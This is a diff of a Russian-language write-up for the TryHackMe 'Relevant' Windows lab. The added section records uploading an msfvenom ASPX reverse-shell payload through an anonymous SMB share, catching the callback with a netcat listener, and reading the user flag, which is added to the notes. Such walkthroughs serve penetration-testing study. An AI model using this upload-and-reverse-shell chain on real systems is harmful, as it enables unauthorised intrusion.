@@ -1,7 +1,7 @@
 # TryHackMe - Win Medium - Relevant
 
 📅 Дата: 2025-07-08  
-🧠 Сложность:  
+🧠 Сложность: Medium  
 💻 IP-адрес: 10.10.254.155  
 
 ---
@@ -253,11 +253,48 @@ Bill
 
 ## ⚙️ Привилегии
 
+Создаю реверс шелл
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.104.16 LPORT=4444 -f aspx > shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3395 bytes
+```
 
+И загружаю через smb
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
+└─$ smbclient //$ip/nt4wrksv -N
+Try "help" to get a list of possible commands.
+smb: \> put shell.aspx
+putting file shell.aspx as \shell.aspx (5.1 kb/s) (average 5.1 kb/s)
+smb: \> 
+```
+
+Перехожу по `http://10.10.42.142:49663/nt4wrksv/shell.aspx`, получаю сессию и читаю флаг
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
+└─$ nc -lvnp 4444                                                                               
+listening on [any] 4444 ...
+connect to [10.21.104.16] from (UNKNOWN) [10.10.42.142] 49706
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+C:\Users\Bob\Desktop>more user.txt
+more user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+```
 
 ## 🏁 Флаги
 
-- User flag: 
+- User flag: THM{fdk4ka34vk346ksxfr21tg789ktf45} 
 - Root flag: 
 
 ---
